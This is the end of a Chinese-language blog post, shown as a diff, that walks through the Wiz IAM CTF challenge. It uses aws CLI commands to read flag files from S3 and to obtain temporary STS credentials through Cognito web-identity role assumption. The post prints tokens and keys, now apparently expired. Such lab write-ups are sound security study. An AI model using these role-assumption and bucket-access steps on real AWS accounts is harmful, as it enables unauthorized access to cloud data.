+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">eFGa7rl7iEk6FTGC71b7JOn2OZ26IsLs7sS3pDKLztyhtpA6HQSVn9MhnCWNuL5TnYyZqxOvQ/bh3JGUz0BfT3t2hd888TM1ZGPLrWMk
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">JFzYFVlPuWZyN6qsX1AqgIYyTCC1jGXXYJGOuvpq3AghBQHsT3xaYgoGUPgQ3s1tN07/EhgbuRNvL2StEzBcmIgk5eojTYG8xlwJKxDf
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">AbzJrePlk6YxOfTiqdoAqqV98wpKHptNIuqfoBvM=&#34;</span>
+</span></span></code></pre></div><p>注意下session token不能有换行符，不然解析不了</p>
+<p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/iam%20ctf/4.png" alt="Untitled">
+
+</p>
+<p>ls让后cp下载</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws s3 ls s3<span style="color:#ff79c6">:</span><span style="color:#6272a4">//wiz-privatefiles
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>aws s3 cp s3<span style="color:#ff79c6">:</span><span style="color:#6272a4">//wiz-privatefiles/flag1.txt 1.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>cat <span style="color:#bd93f9">1.</span>txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{wiz<span style="color:#ff79c6">:</span>incognito<span style="color:#ff79c6">-</span>is<span style="color:#ff79c6">-</span>always<span style="color:#ff79c6">-</span>suspicious}
+</span></span></code></pre></div><h3 id="6-one-final-push">6. One final push</h3>
+<p>Anonymous access no more. Let&rsquo;s see what can you do now.</p>
+<p>Now try it with the authenticated role:</p>
+<p><em>arn:aws:iam::092297851374:role/Cognito_s3accessAuth_Role</em></p>
+<p>策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;Federated&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;cognito-identity.amazonaws.com&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;sts:AssumeRoleWithWebIdentity&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Condition&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;StringEquals&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;cognito-identity.amazonaws.com:aud&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>还是看action的cil</p>
+<p><a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html">https://awscli.amazonaws.com/v2/documentation/api/latest/reference/sts/assume-role-with-web-identity.html</a></p>
+<p>这个权限 的作用</p>
+<p>为已在移动或 Web 应用程序中使用 Web 标识提供者进行身份验证的用户返回一组临时安全凭证。示例提供商包括 OAuth 2.0 提供商 Login with Amazon 和 Facebook，或任何与 OpenID Connect 兼容的身份提供商，例如 Google 或 Amazon Cognito 联合身份。</p>
+<p>简单来说发一个临时的安全凭证</p>
+<pre tabindex="0"><code>  assume-role-with-web-identity
+--role-arn &lt;value&gt; 给的有
+--role-session-name &lt;value&gt; 随便填
+--web-identity-token &lt;value&gt; 需要通过身份池ID token获得
+</code></pre><p>先获取身份id</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws cognito<span style="color:#ff79c6">-</span>identity get<span style="color:#ff79c6">-</span>id <span style="color:#ff79c6">--</span>identity<span style="color:#ff79c6">-</span>pool<span style="color:#ff79c6">-</span>id us<span style="color:#ff79c6">-</span>east<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span>b73cb2d2<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0</span>d00<span style="color:#ff79c6">-</span><span style="color:#bd93f9">4</span>e77<span style="color:#ff79c6">-</span><span style="color:#bd93f9">8</span>e80<span style="color:#ff79c6">-</span>f99d9c13da3b
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;IdentityId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>再拿id token</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws cognito<span style="color:#ff79c6">-</span>identity get<span style="color:#ff79c6">-</span>open<span style="color:#ff79c6">-</span>id<span style="color:#ff79c6">-</span>token <span style="color:#ff79c6">--</span>identity<span style="color:#ff79c6">-</span>id us<span style="color:#ff79c6">-</span>east<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">157</span>d6171<span style="color:#ff79c6">-</span>ee6b<span style="color:#ff79c6">-</span>c59a<span style="color:#ff79c6">-</span><span style="color:#bd93f9">0528</span><span style="color:#ff79c6">-</span>eddcea45a9e3
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;IdentityId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Token&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">3ZDYxNzEtZWU2Yi1jNTlhLTA1MjgtZWRkY2VhNDVhOWUzIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">3cy5jb20iLCJleHAiOjE3MDY0MzkzNTMsImlhdCI6MTcwNjQzODc1M30.fhYrm3lhS61vUd-mALuzKnnsg_yLgqa1X428jBU5CQgN3_r
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">i0nslvvhrFWFQeZOp_44BBlxOZK_Rdq3uwfO86bOzqzGfwTOQwLqt0EBXd732RVqJ0sQuE9fnN2L9dwaUHn3Jaz1Ki4C_HOx1JNrG284
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">J2HFcqxSNIQzcYXtVWzviCup3VPRZksmFpaAUh9o9xj1tcWPcXR5yepbAMW252vL1FB95bJDYXv1cRLGt9sEEdx1CnObSBgBb-1I30lE
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">vssKrdatvtQs8BljhoweypvcmW_LSP772oxgzi5-cGud_NC6RtgFlXKIjfGLvEwTdAcKN9xyydDgmk8XIu2y_7Q&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>最后调用sts assume-role-with-web-identity 生成STS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws sts assume<span style="color:#ff79c6">-</span>role<span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">with</span><span style="color:#ff79c6">-</span>web<span style="color:#ff79c6">-</span>identity <span style="color:#ff79c6">--</span>role<span style="color:#ff79c6">-</span>arn arn<span style="color:#ff79c6">:</span>aws<span style="color:#ff79c6">:</span>iam<span style="color:#ff79c6">::</span><span style="color:#bd93f9">092297851374</span><span style="color:#ff79c6">:</span>role<span style="color:#ff79c6">/</span>Cognito_s3accessAuth_Role <span style="color:#ff79c6">--</span>role<span style="color:#ff79c6">-</span>session<span style="color:#ff79c6">-</span>name muscial <span style="color:#ff79c6">--</span>web<span style="color:#ff79c6">-</span>identity<span style="color:#ff79c6">-</span>token <span style="color:#f1fa8c">&#34;eyJraWQiOiJ1cy1lYXN0LTE1IiwidHlwIjoiSldTIiwiYWxnIjoiUlM1MTIifQ.eyJzdWIiOiJ1cy1lYXN0LTE6MTU3ZDYxNzEtZWU2Yi1jNTlhLTA1MjgtZWRkY2VhNDVhOWUzIiwiYXVkIjoidXMtZWFzdC0xOmI3M2NiMmQyLTBkMDAtNGU3Ny04ZTgwLWY5OWQ5YzEzZGEzYiIsImFtciI6WyJ1bmF1dGhlbnRpY2F0ZWQiXSwiaXNzIjoiaHR0cHM6Ly9jb2duaXRvLWlkZW50aXR5LmFtYXpvbmF3cy5jb20iLCJleHAiOjE3MDY0MzkzNTMsImlhdCI6MTcwNjQzODc1M30.fhYrm3lhS61vUd-mALuzKnnsg_yLgqa1X428jBU5CQgN3_ri0nslvvhrFWFQeZOp_44BBlxOZK_Rdq3uwfO86bOzqzGfwTOQwLqt0EBXd732RVqJ0sQuE9fnN2L9dwaUHn3Jaz1Ki4C_HOx1JNrG284J2HFcqxSNIQzcYXtVWzviCup3VPRZksmFpaAUh9o9xj1tcWPcXR5yepbAMW252vL1FB95bJDYXv1cRLGt9sEEdx1CnObSBgBb-1I30lEvssKrdatvtQs8BljhoweypvcmW_LSP772oxgzi5-cGud_NC6RtgFlXKIjfGLvEwTdAcKN9xyydDgmk8XIu2y_7Q&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Credentials&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;AccessKeyId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;ASIARK7LBOHXOIPMF7EC&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SecretAccessKey&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;UaCjY3dt+f7jDj01IYGO9kN1ypKkRUpfpoE5lBGC&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;SessionToken&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;FwoGZXIvYXdzECwaDPAhLeF0sUmdkE5+LyKfAgsyDZylWNaxzZFmeduS4LVbM/jf8GyR1ynV8eY1FsxYfQrGsFTHKfAz0M2GDFjF3PslHIFgaTRd1Aw+CNTT59iGV1qKNeyDt6tK8iIDYtAHRlNB9OW6SSpwq2uni6W+DTCkOOIEt8ZErBl8QP5LLHZWMYP8pYGwnT+7AbuLUUb6VSufX7c0oik2XgCq2cYyrwIMxHCY3HVBaMcPbVkvtZXVxc5RAW8SrVmAiL1bL/u/wCeddbVS58Dp4OGWRoxLl1ytashDpZmt3QnFfbFnGt6fQ/yQ+J0amia5hjV02cFw2nkGcvAk9aB/qn1agQyxhmnsCNrxiSBZO5zmE0lnq6UkcFb4UZH7Sl2XMpjssFUcQqr2ywNomO7AY8OScmi7KNXh2K0GMpYBCydzSZh2jy+nqcU1G5uq8dVciARXlFXrF5chhNdJqRr4h0t8JP0aNTwlpQ6RhTyzaS5nZ7x9Ukv4KouqOzsQHArDqgULyUfbtX/wgbHaAksTD/4XPz/UtMfzPWgeePB7CcmeQNwNwM/Z1xcmEWoDsQzUxFflVNzS064ay3QEx4HKY/7xYqZ9RGrGMiCwZl1GkuKuH+Nk&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Expiration&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2024-01-28T11:47:49+00:00&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;SubjectFromWebIdentityToken&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:157d6171-ee6b-c59a-0528-eddcea45a9e3&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;AssumedRoleUser&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;AssumedRoleId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;AROARK7LBOHXASFTNOIZG:muscial&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Arn&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:sts::092297851374:assumed-role/Cognito_s3accessAuth_Role/muscial&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Provider&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;cognito-identity.amazonaws.com&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Audience&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;us-east-1:b73cb2d2-0d00-4e77-8e80-f99d9c13da3b&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>set时间</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>set AWS_ACCESS_KEY_ID<span style="color:#ff79c6">=</span>ASIARK7LBOHXGW5IDE55
+</span></span><span style="display:flex;"><span>set AWS_SECRET_ACCESS_KEY<span style="color:#ff79c6">=</span>ASIARK7LBOHXGW5IDE55
+</span></span><span style="display:flex;"><span>set AWS_SESSION_TOKEN<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;FwoGZXIvYXdzECwaDEqi/YoFKxKp2A9jISKfAns25QgQ0N2yUoTUwaN3BdOIPrKcTKiMKF6tJFwP4aEveNiiPRFkm2M/LtHvluhLyDc5CJDKh32m4OOQteJwWzR/8LxWLwjlyL/EC+eyO50asKVNX8Bd2bID+5+oV1eGMBRkUsB7RD7q7cvB8sRRVdYn9nf3CKL0GqjkC8dayVibIw1OIPksihVpNBp3xWetCmV8jQ2YPVuN8vx/obHybzD5dHYNvXCAHRRWg2YSyqjcsJsu22rmSqSgB0hdLaaH5r3QPGWclmHsVcquOSnOIai0WPpqBr8RCFnaJ3B0TGvbpWXDShl31VdEVymQtMTRJnMI9t2Rf1hwhTCcqw9jX5a96GHI4PaOXNvhitqBVJLJH3MQH76nOxtBW5ufnSFbKMzd2K0GMpYBAUTi1FbfOEnqjbwx6QWvS6jIr9HguBEEciVdEu6mlNFOG6SFUEpGs45GPmVGmAqasCKv22fket26MikQ9OzBI3f0Q7B24Nw++evTrOVCaZr9H3kSRo1TivJWmv5tx0X8PgJRU8XQk1jJ3EutdVIixDPkxCXzwLVclPK0zISKFMAZfNSNpGXbiaXImRrI9HL3xtVv35NS&#34;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws configure set aws_access_key_id ASIARK7LBOHXOIPMF7EC
+</span></span><span style="display:flex;"><span>aws configure set aws_secret_access_key UaCjY3dt<span style="color:#ff79c6">+</span>f7jDj01IYGO9kN1ypKkRUpfpoE5lBGC
+</span></span><span style="display:flex;"><span>aws configure set aws_session_token <span style="color:#f1fa8c">&#34;FwoGZXIvYXdzECwaDPAhLeF0sUmdkE5+LyKfAgsyDZylWNaxzZFmeduS4LVbM/jf8GyR1ynV8eY1FsxYfQrGsFTHKfAz0M2GDFjF3PslHIFgaTRd1Aw+CNTT59iGV1qKNeyDt6tK8iIDYtAHRlNB9OW6SSpwq2uni6W+DTCkOOIEt8ZErBl8QP5LLHZWMYP8pYGwnT+7AbuLUUb6VSufX7c0oik2XgCq2cYyrwIMxHCY3HVBaMcPbVkvtZXVxc5RAW8SrVmAiL1bL/u/wCeddbVS58Dp4OGWRoxLl1ytashDpZmt3QnFfbFnGt6fQ/yQ+J0amia5hjV02cFw2nkGcvAk9aB/qn1agQyxhmnsCNrxiSBZO5zmE0lnq6UkcFb4UZH7Sl2XMpjssFUcQqr2ywNomO7AY8OScmi7KNXh2K0GMpYBCydzSZh2jy+nqcU1G5uq8dVciARXlFXrF5chhNdJqRr4h0t8JP0aNTwlpQ6RhTyzaS5nZ7x9Ukv4KouqOzsQHArDqgULyUfbtX/wgbHaAksTD/4XPz/UtMfzPWgeePB7CcmeQNwNwM/Z1xcmEWoDsQzUxFflVNzS064ay3QEx4HKY/7xYqZ9RGrGMiCwZl1GkuKuH+Nk&#34;</span>
+</span></span></code></pre></div><p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/iam%20ctf/5.png" alt="Untitled">
+
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws s3api list<span style="color:#ff79c6">-</span>objects <span style="color:#ff79c6">--</span>bucket wiz<span style="color:#ff79c6">-</span>privatefiles<span style="color:#ff79c6">-</span>x1000
+</span></span><span style="display:flex;"><span>aws s3api get<span style="color:#ff79c6">-</span>object <span style="color:#ff79c6">--</span>bucket wiz<span style="color:#ff79c6">-</span>privatefiles<span style="color:#ff79c6">-</span>x1000 <span style="color:#ff79c6">--</span>key flag2.txt flag2.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{wiz<span style="color:#ff79c6">:</span>open<span style="color:#ff79c6">-</span>sesame<span style="color:#ff79c6">-</span>or<span style="color:#ff79c6">-</span>shell<span style="color:#ff79c6">-</span>i<span style="color:#ff79c6">-</span>say<span style="color:#ff79c6">-</span>openid}
+</span></span></code></pre></div>
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/%E4%BA%91%E6%9C%8D%E5%8A%A1/" data-toggle="tooltip" data-placement="top" title="云服务基础">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/11/03/hello-world/" data-toggle="tooltip" data-placement="top" title="Welcome to Muscial Blog">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://3cly.github.io/link/">3cly的博客</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:muscial@outlook.jp">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/Muscial">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Muscial Blog 2024
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
